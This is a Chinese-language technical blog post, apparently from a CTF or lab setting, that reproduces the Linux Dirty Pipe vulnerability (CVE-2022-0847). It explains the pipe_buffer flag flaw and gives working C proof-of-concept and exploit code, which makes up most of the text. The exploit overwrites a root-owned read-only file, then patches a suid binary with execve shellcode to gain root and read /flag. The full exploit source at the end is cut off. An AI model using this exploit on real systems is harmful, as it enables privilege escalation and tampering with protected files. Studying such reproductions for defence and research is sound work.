<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这意味着我们将其他文件描述符接入管道时，该管道对应的结构体<code>struct pipe_buffer</code>中的<code>flags</code>是会保持原样的</p>
<p>而由上所述，当<code>flags</code>设置中存在<code>PIPE_BUF_FLAG_CAN_MERGE</code>这个设置时，我们是可以<strong>直接写入文件内容的</strong>，没有任何和文件权限相关的校验</p>
<p>这意味着我们拿到了一个Linux文件系统任意文件写，之后的利用手法多种多样了，既可以覆写&#x2F;etc&#x2F;passwd，也可以覆写suid 程序</p>
<p>下面我们具体复现一下每一个过程</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="PoC-部分"><a href="#PoC-部分" class="headerlink" title="PoC 部分"></a>PoC 部分</h3><p>首先，我们以只读模式打开一个权限为<code>400</code>，拥有者为root的文件，这意味着我们没有写入的权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: Reproduce CVE-2022-0847 &lt;PoC&gt;</span></span><br><span class="line">  step(<span class="string">&quot;Reproduce CVE-2022-0847 &lt;PoC&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> root_fd = check(open(root_file_name, O_RDONLY));</span><br><span class="line">  info(<span class="string">&quot;Open root file with fd %d\n&quot;</span>, root_fd);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Root file content:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(check_file(root_fd));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后，我们查看它的内容，作为之后的对比</p>
<p>下一步，我们创建一组pipe，并把它们所有的<code>pipe_buffer</code>结构体中的<code>flags</code>字段都设置上<code>PIPE_BUF_FLAG_CAN_MERGE</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  info(<span class="string">&quot;Make new pipe fds\n&quot;</span>);</span><br><span class="line">  check(pipe(pipe_fd1));</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *buffer = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write(pipe_fd1[<span class="number">1</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;Write 0x10 pages to pipe\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;Now this pipe has flag PIPE_BUF_FLAG_CAN_MERGE\n&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>事实上，在<code>pipe()</code>函数初始化时，内核会默认分配大小为16的<code>pipe_buffer</code>结构体数组，<br>因此，我们需要填充0x10(16)个页来保证每一个<code>pipe_buffer</code>的<code>flags</code>字段都被设置</p>
</blockquote>
<p>具体方法如上所示，就是直接一页一页地写入数据即可</p>
<p>之后是关键步骤，但是内容很简略</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  check(read(pipe_fd1[<span class="number">0</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  check(lseek(root_fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(splice(root_fd, <span class="literal">NULL</span>, pipe_fd1[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0x10</span>, SPLICE_F_MOVE));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buffer, <span class="string">&quot;hamood?&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  check(write(pipe_fd1[<span class="number">1</span>], buffer, <span class="number">0x8</span>));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>pipe_buffer</code>已满，我们需要先清空一个<code>pipe_buffer</code>，方法是直接读出</p>
<p>之后，我们先重置<code>root_fd</code>文件对应的文件指针的位置(<code>lseek()</code>)，并调用<code>splice()</code>，将其接入<code>pipe_fd1[1]</code>中去</p>
<p>根据参数的顺序，<code>splice()</code>会将<code>root_fd</code>这个只读文件作为发送端，<code>pipe_fd1[1]</code>作为接收端，从前者读取数据输送到后者中去</p>
<p>读取内容的大小由参数确定，为<code>0x10</code>，此时<code>pipe_fd1</code>对应的pipe管道会有0x10个字节的偏移</p>
<p>之后，我们仍往<code>pipe_fd1[1]</code>管道中写入数据。按照之前的分析，<code>pipe_buffer-&gt;flags</code>此时仍然有<code>PIPE_BUF_FLAG_CAN_MERGE</code>，但是该pipe对应的页已经被替换成只读文件了。于是，pipe会在只读文件上留下我们写入的内容，偏移则是由于我们之前写入造成的偏移，为0x10字节</p>
<p>最后，我们再查看该只读文件，并寻找我们写入的字符串内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  info(<span class="string">&quot;Root file content now:\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *cve_chk = check_file(root_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(cve_chk, <span class="string">&quot;hamood?&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">free</span>(cve_chk);</span><br><span class="line">    success(<span class="string">&quot;CVE-2022-0847 reproduced successfully!\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(cve_chk);</span><br><span class="line">    err_exit(<span class="string">&quot;Failed to reproduce CVE-2022-0847&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(pipe_fd1[<span class="number">0</span>]);</span><br><span class="line">  close(pipe_fd1[<span class="number">1</span>]);</span><br><span class="line">  close(root_fd);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意到，我们对文件的写入还是局限在一个页内的，且在<code>splice()</code>调用的过程是会写入至少一比特的内容的。<br>这意味着我们无法从头覆写一个文件</p>
</blockquote>
<p><img src="/images/CVE/CVE-2022-0847/PoC.png" alt="PoC"></p>
<h3 id="Exp-部分"><a href="#Exp-部分" class="headerlink" title="Exp 部分"></a>Exp 部分</h3><p>接下来，我们准备对其要进行利用，目标是运行一个root权限(uid &#x3D;&#x3D; 0)的程序来拿到根目录的<code>/flag</code></p>
<p>这里，我选取了一个suid程序<code>/sbin/poweroff</code>，它在我们退出qemu时会被调用</p>
<blockquote>
<p>由于我采用<code>busybox</code>来构建这个文件系统，事实上所以的<code>/bin</code>和<code>/sbin</code>程序全都是<code>busybox</code>的软链接，我们更改哪一个都是对<code>busybox</code>进行更改</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="string">&quot;\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x00\x00\xda\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H\xc7\xc1\x66/shQH\xb9/&quot;</span></span><br><span class="line">    <span class="string">&quot;home/&quot;</span></span><br><span class="line">    <span class="string">&quot;ctQT_H1\xf6H1\xd2j;X\x0f\x05\x90\x90&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/hoem/ctf/sh&quot;, NULL, NULL)</span></span><br><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// INFO: Step 0x03: Reproduce CVE-2022-0847 &lt;Exp&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUID_FILE <span class="string">&quot;/sbin/poweroff&quot;</span></span></span><br><span class="line">  step(<span class="string">&quot;Reproduce CVE-2022-0847 &lt;Exp&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> evil_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> suid_fd = check(open(SUID_FILE, O_RDONLY));</span><br><span class="line">  <span class="type">uint64_t</span> offset = <span class="number">0x1</span>;</span><br><span class="line">  pipe(evil_pipe);</span><br><span class="line">  info(<span class="string">&quot;Open suid file &quot;</span> SUID_FILE <span class="string">&quot; with fd %d\n&quot;</span>, root_fd);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Use CVE-2022-0847 to overwrite &quot;</span> SUID_FILE <span class="string">&quot;...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write(evil_pipe[<span class="number">1</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(read(evil_pipe[<span class="number">0</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  check(lseek(root_fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(splice(root_fd, <span class="literal">NULL</span>, evil_pipe[<span class="number">1</span>], <span class="literal">NULL</span>, offset, SPLICE_F_MOVE));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buffer, shellcode + offset, <span class="keyword">sizeof</span>(shellcode) - offset);</span><br><span class="line">  check(write(evil_pipe[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(shellcode) - offset));</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> suid_chk_fd = check(open(SUID_FILE, O_RDONLY));</span><br><span class="line">  <span class="built_in">free</span>(check_file(suid_chk_fd));</span><br><span class="line">  success(<span class="string">&quot;Change suid file &quot;</span> SUID_FILE</span><br><span class="line">          <span class="string">&quot; successfully, Now trigger manually\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(buffer);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照我们之前PoC的手法，我们准备覆写该文件。我准备将原ELF文件前边部分覆写上一段简短的ELF文件，其内容除去文件头仅仅是一段简单的shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, 0x68732f66;</span><br><span class="line">push rcx;</span><br><span class="line">mov rcx, 0x74632f656d6f682f;</span><br><span class="line">push rcx;</span><br><span class="line"></span><br><span class="line">push rsp;</span><br><span class="line">pop rdi;</span><br><span class="line"></span><br><span class="line">xor rsi, rsi;</span><br><span class="line">xor rdx, rdx;</span><br><span class="line"></span><br><span class="line">push 59;</span><br><span class="line">pop rax;</span><br><span class="line">syscall;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br></pre></td></tr></table></figure>

<p>其内容为<code>execve(&quot;/hoem/ctf/sh&quot;, NULL, NULL)</code>。由于该手法一次只能有偏移地覆盖一页(0x1000)以内的内容，我们仅将前边部分覆写。</p>
<p>由于ELF文件头被更改，程序事实上的开始执行的位置也被劫持到我们的shellcode，因此这样是没有问题的</p>
<p>接着，我们便可以通过<code>/home/ctf/sh</code>这个文件以root身份任意执行代码，方法是直接退出qemu就会触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sendfile.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  sendfile(<span class="number">1</span>, open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>), <span class="literal">NULL</span>, <span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    sleep(<span class="number">0x100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上是一个简单的获取”&#x2F;flag”的程序，我们可以换成不同的代码完成各种事情。</p>
<blockquote>
<p>尝试直接放入busybox变身的sh或者busybox_ASH程序的行为都会Segment Fault，猜测可能是环境变量导致的(?)</p>
</blockquote>
<p>最终结果如下所示：</p>
<p><img src="/images/CVE/CVE-2022-0847/Exp.png" alt="exp"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #include &quot;./bpf_insn.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;keyutils.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;linux/if_packet.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span> <span class="comment">// 添加 if_nametoindex 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_VERSION <span class="string">&quot;5.8.1&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./klog.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./kpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> fd;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *file_name = <span class="string">&quot;/home/ctf/dirty_pipe&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *root_file_name = <span class="string">&quot;/home/ctf/root_file&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="string">&quot;\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x00\x00\xda\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H\xc7\xc1\x66/shQH\xb9/&quot;</span></span><br><span class="line">    <span class="string">&quot;home/&quot;</span></span><br><span class="line">    <span class="string">&quot;ctQT_H1\xf6H1\xd2j;X\x0f\x05\x90\x90&quot;</span>;</span><br><span class="line"><span class="comment">// execve(&quot;/hoem/ctf/sh&quot;, NULL, NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(BLUE <span class="string">&quot;==========================================\n&quot;</span> END);</span><br><span class="line">  <span class="built_in">printf</span>(CYAN <span class="string">&quot;          Linux CVE-2022-0847 Exp          \n&quot;</span> END);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               by&quot;</span> YELLOW <span class="string">&quot; NazrinDuck\n&quot;</span> END);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;           Kernel Version: &quot;</span> RED KERNEL_VERSION END <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(BLUE <span class="string">&quot;==========================================\n&quot;</span> END);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) init() &#123;</span><br><span class="line">  bind_cpu(<span class="number">0</span>);</span><br><span class="line">  banner();</span><br><span class="line">  adjust_rlimit();</span><br><span class="line">  page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">  info(<span class="string">&quot;page size: %#lx\n&quot;</span>, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">close_file</span><span class="params">()</span> &#123; close(fd); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_file</span><span class="params">()</span> &#123;</span><br><span class="line">  fd = open(file_name, O_CREAT | O_RDWR | O_TRUNC, S_IRUSR | S_IWUSR);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;Fail to create file&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;Create file and write to it\n&quot;</span>);</span><br><span class="line">  info(<span class="string">&quot;fd: %lu\n&quot;</span>, fd);</span><br><span class="line">  write(fd, <span class="string">&quot;aaaabbbb&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  check(fsync(fd));</span><br><span class="line">  atexit(close_file);</span><br><span class="line">&#125;</span><br><span 